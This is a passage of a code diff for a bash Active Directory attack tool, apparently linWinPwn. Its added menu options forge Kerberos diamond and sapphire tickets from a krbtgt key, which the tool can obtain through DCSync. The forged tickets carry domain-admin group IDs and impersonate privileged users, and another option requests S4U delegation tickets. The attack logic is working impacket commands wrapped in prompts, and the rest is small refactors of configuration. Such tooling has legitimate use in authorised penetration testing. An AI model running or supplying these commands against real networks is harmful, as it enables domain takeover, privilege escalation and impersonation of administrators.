+                if [[ ! "${tick_user_id_value}" == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
+                echo -e "${BLUE}[*] Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
+                read -rp ">> " tick_group_ids_value </dev/tty
+                if [[ ! "${tick_group_ids_value}" == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
+                get_domain_sid
+                while [[ "${sid_domain}" == "" ]]; do
+                    echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
+                    read -rp ">> " sid_domain </dev/tty
+                done
+                echo -e "${CYAN}[*] Generating diamond ticket...${NC}"
+                current_dir=$(pwd)
+                cd "${output_dir}/Credentials" || exit
+                run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} ${gethash_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
+                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_diamond.ccache" 2>/dev/null
+                cd "${current_dir}" || exit
+                if [ -f "${output_dir}/Credentials/${tick_randuser}_diamond.ccache" ]; then
+                    echo -e "${GREEN}[+] Diamond ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_diamond.ccache"
+                else
+                    echo -e "${RED}[-] Failed to generate diamond ticket${NC}"
+                fi
+            fi
+        fi
         kerberos_menu
         ;;
 
     15)
+        if [ ! -f "${impacket_ticketer}" ]; then
+            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
+        else
+            echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
+            read -rp ">> " rc4_or_aes </dev/tty
+            while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
+                echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
+                read -rp ">> " rc4_or_aes </dev/tty
+            done
+            gethash_user="krbtgt"
+            gethash_hash=""
+            echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
+            read -rp ">> " gethash_hash </dev/tty
+            if [[ ${gethash_hash} == "" ]]; then
+                get_hash
+            else
+                if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
+            fi
+
+            if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
+                echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
+            else
+                gethash_key="-nthash ${gethash_nt} -aesKey ${gethash_aes}"
+                tick_randuser="sql_svc"
+                tick_user_id="1337"
+                tick_groups="512,513,518,519,520"
+                tick_domain_admin="${user}"
+                echo -e "${BLUE}[*] Please specify random user name (press Enter to choose default value 'sql_svc'):"
+                read -rp ">> " tick_randuser_value </dev/tty
+                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                echo -e "${BLUE}[*] Please specify custom user id (press Enter to choose default value '1337'):"
+                read -rp ">> " tick_user_id_value </dev/tty
+                if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
+                echo -e "${BLUE}[*] Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
+                read -rp ">> " tick_group_ids_value </dev/tty
+                if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
+                echo -e "${BLUE}[*] Please specify domain admin to impersonate (press Enter to choose default value current user):"
+                read -rp ">> " tick_domain_admin_value </dev/tty
+                if [[ ! ${tick_domain_admin_value} == "" ]]; then tick_domain_admin="${tick_domain_admin_value}"; fi
+                get_domain_sid
+                while [[ "${sid_domain}" == "" ]]; do
+                    echo -e "${YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}"
+                    read -rp ">> " sid_domain </dev/tty
+                done
+                echo -e "${CYAN}[*] Generating sapphire ticket...${NC}"
+                current_dir=$(pwd)
+                cd "${output_dir}/Credentials" || exit
+                run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} -impersonate ${tick_domain_admin} ${gethash_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
+                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_sapphire.ccache" 2>/dev/null
+                cd "${current_dir}" || exit
+                if [ -f "${output_dir}/Credentials/${tick_randuser}_sapphire.ccache" ]; then
+                    echo -e "${GREEN}[+] Sapphire ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_sapphire.ccache"
+                else
+                    echo -e "${RED}[-] Failed to generate sapphire ticket${NC}"
+                fi
+            fi
+        fi
+        kerberos_menu
+        ;;
+
+    16)
+        raise_child
+        kerberos_menu
+        ;;
+
+    17)
         if [ ! -f "${impacket_getST}" ]; then
             echo -e "${RED}[-] getST.py not found! Please verify the installation of impacket${NC}"
         else
-            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
+            if [ "${nullsess_bool}" == true ]; then
+                echo -e "${RED}[-] Requesting ticket using getST requires credentials${NC}"
+            else
                 tick_randuser="Administrator"
                 tick_spn="CIFS/${dc_domain}"
-                tick_servuser=""
 
-                echo -e "${BLUE}[*] Please specify name of account with Delegation rights (for example 'gmsa'):"
-                read -rp ">> " tick_servuser </dev/tty
-                while [[ "${tick_servuser}" == "" ]]; do
-                    echo -e "${RED}Invalid username.${NC} Please specify another:"
-                    read -rp ">> " tick_servuser </dev/tty
-                done
-
-                echo -e "${BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:"
-                read -rp ">> " rc4_or_aes </dev/tty
-                while [ "${rc4_or_aes}" != "RC4" ] && [ "${rc4_or_aes}" != "AES" ]; do
-                    echo -e "${RED}Invalid input${NC} Please choose between 'RC4' and 'AES':"
-                    read -rp ">> " rc4_or_aes </dev/tty
-                done
-                gethash_hash=""
-                echo -e "${BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):"
-                read -rp ">> " gethash_hash </dev/tty
-                if [[ ${gethash_hash} == "" ]]; then
-                    gethash_user=$tick_servuser
-                    get_hash
+                echo -e "${BLUE}[*] Please specify username of user to impersonate (press Enter to choose default value 'Administrator'):"
+                read -rp ">> " tick_randuser_value </dev/tty
+                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
+                read -rp ">> " tick_spn_value </dev/tty
+                if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
+                echo -e "${CYAN}[*] Requesting ticket for service ${tick_spn}...${NC}"
+                current_dir=$(pwd)
+                cd "${output_dir}/Credentials" || exit
+                run_command "${impacket_getST} ${argument_imp} -spn ${tick_spn} -impersonate ${tick_randuser}"
+                ticket_ccache_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
+                ticket_kirbi_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
+                run_command "${impacket_ticketconverter} ./${ticket_ccache_out} ./${ticket_kirbi_out}"
+                cd "${current_dir}" || exit
+                if [ -f "${output_dir}/Credentials/${ticket_ccache_out}" ]; then
+                    echo -e "${GREEN}[+] Delegated ticket successfully requested :${NC}"
+                    echo -e "${output_dir}/Credentials/${ticket_ccache_out}"
+                    echo -e "${output_dir}/Credentials/${ticket_kirbi_out}"
                 else
-                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_nt=$gethash_hash; else gethash_aes=$gethash_hash; fi
+                    echo -e "${RED}[-] Failed to request ticket${NC}"
                 fi
-
-                if [[ ${gethash_nt} == "" ]] && [[ ${gethash_aes} == "" ]]; then
-                    echo -e "${RED}[-] Failed to extract hash of ${gethash_user}${NC}"
-                else
-                    if [[ ${rc4_or_aes} == "RC4" ]]; then gethash_key="-hashes :${gethash_nt}"; else gethash_key="-aesKey ${gethash_aes}"; fi
-
-                    echo -e "${BLUE}[*] Please specify user name of user to impersonate (press Enter to choose default value 'Administrator'):"
-                    read -rp ">> " tick_randuser_value </dev/tty
-                    if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
-                    echo -e "${BLUE}[*] Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
-                    read -rp ">> " tick_spn_value </dev/tty
-                    if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
-                    echo -e "${CYAN}[*] Requesting ticket for service $tick_spn_value...${NC}"
-                    current_dir=$(pwd)
-                    cd "${output_dir}/Credentials" || exit
-                    run_command "${impacket_getST} ${domain}/${tick_servuser} -spn ${tick_spn} ${gethash_key} -impersonate ${tick_randuser}"
-                    ticket_ccache_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.ccache"
-                    ticket_kirbi_out="${tick_randuser}@$(echo "${tick_spn}" | sed 's/\//_/g')@${dc_domain^^}.kirbi"
-                    run_command "${impacket_ticketconverter} ./${ticket_ccache_out} ./${ticket_kirbi_out}"
-                    cd "${current_dir}" || exit
-                    if [ -f "${output_dir}/Credentials/${ticket_ccache_out}" ]; then
-                        echo -e "${GREEN}[+] Delegated ticket successfully requested :${NC}"
-                        echo -e "${output_dir}/Credentials/${ticket_ccache_out}"
-                        echo -e "${output_dir}/Credentials/${ticket_kirbi_out}"
-                    else
-                        echo -e "${RED}[-] Failed to request ticket${NC}"
-                    fi
-                fi
-            else
-                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
             fi
         fi
         kerberos_menu
@@ -5471,66 +5607,22 @@ config_menu() {
         ;;
 
     2)
-        echo -e ""
-        sudo timedatectl set-ntp 0
-        sudo ntpdate "${dc_ip}"
-        echo -e "${GREEN}[+] NTP sync complete${NC}"
+        ntp_update
         config_menu
         ;;
 
     3)
-        echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
-        echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
-        echo -e "${GREEN}[+] /etc/hosts update complete${NC}"
+        etc_hosts_update
         config_menu
         ;;
 
     4)
-        echo -e ""
-        date "+%Y-%m-%d\ %H:%M:%S" | tee -a "${output_dir}/resolv.conf.backup"
-        echo -e "Content of /etc/resolv.conf before update:" | tee -a "${output_dir}/resolv.conf.backup"
-        echo -e "------------------------------------------" | tee -a "${output_dir}/resolv.conf.backup"
-        tee -a "${output_dir}/resolv.conf.backup" </etc/resolv.conf
-        echo -e "" | tee -a "${output_dir}/resolv.conf.backup"
-        echo -e "Content of /etc/resolv.conf after update:"
-        echo -e "-----------------------------------------"
-        sudo sed -i '/^#/! s/^/#/g' /etc/resolv.conf
-        echo -e "nameserver ${dc_ip}" | sudo tee -a /etc/resolv.conf
-        echo -e "${GREEN}[+] DNS update complete${NC}"
+        etc_resolv_update
         config_menu
         ;;
 
     5)
-        echo -e ""
-        date "+%Y-%m-%d\ %H:%M:%S" | tee -a "${output_dir}/krb5.conf.backup"
-        echo -e "Content of /etc/krb5.conf before update:" | tee -a "${output_dir}/krb5.conf.backup"
-        echo -e "----------------------------------------" | tee -a "${output_dir}/krb5.conf.backup"
-        tee -a "${output_dir}/krb5.conf.backup" </etc/krb5.conf
-        echo -e "" | tee -a "${output_dir}/krb5.conf.backup"
-        echo -e "Content of /etc/krb5.conf after update:"
-        echo -e "---------------------------------------"
-        echo -e "[libdefaults]" | sudo tee /etc/krb5.conf
-        echo -e "        default_realm = ${domain^^}" | sudo tee -a /etc/krb5.conf
-        echo -e "" | sudo tee -a /etc/krb5.conf
-        echo -e "# The following krb5.conf variables are only for MIT Kerberos." | sudo tee -a /etc/krb5.conf
-        echo -e "        kdc_timesync = 1" | sudo tee -a /etc/krb5.conf
-        echo -e "        ccache_type = 4" | sudo tee -a /etc/krb5.conf
-        echo -e "        forwardable = true" | sudo tee -a /etc/krb5.conf
-        echo -e "        proxiable = true" | sudo tee -a /etc/krb5.conf
-        echo -e "        rdns = false" | sudo tee -a /etc/krb5.conf
-        echo -e "" | sudo tee -a /etc/krb5.conf
-        echo -e "" | sudo tee -a /etc/krb5.conf
-        echo -e "# The following libdefaults parameters are only for Heimdal Kerberos." | sudo tee -a /etc/krb5.conf
-        echo -e "        fcc-mit-ticketflags = true" | sudo tee -a /etc/krb5.conf
-        echo -e "" | sudo tee -a /etc/krb5.conf
-        echo -e "[realms]" | sudo tee -a /etc/krb5.conf
-        echo -e "        ${domain^^} = {" | sudo tee -a /etc/krb5.conf
-        echo -e "                kdc = ${dc_FQDN}" | sudo tee -a /etc/krb5.conf
-        echo -e "        }" | sudo tee -a /etc/krb5.conf
-        echo -e "" | sudo tee -a /etc/krb5.conf
-        echo -e "[domain_realm]" | sudo tee -a /etc/krb5.conf
-        echo -e "        .${domain} = ${domain^^}" | sudo tee -a /etc/krb5.conf
-        echo -e "${GREEN}[+] KRB5 config update complete${NC}"
+        etc_krb5conf_update
         config_menu
         ;;
 
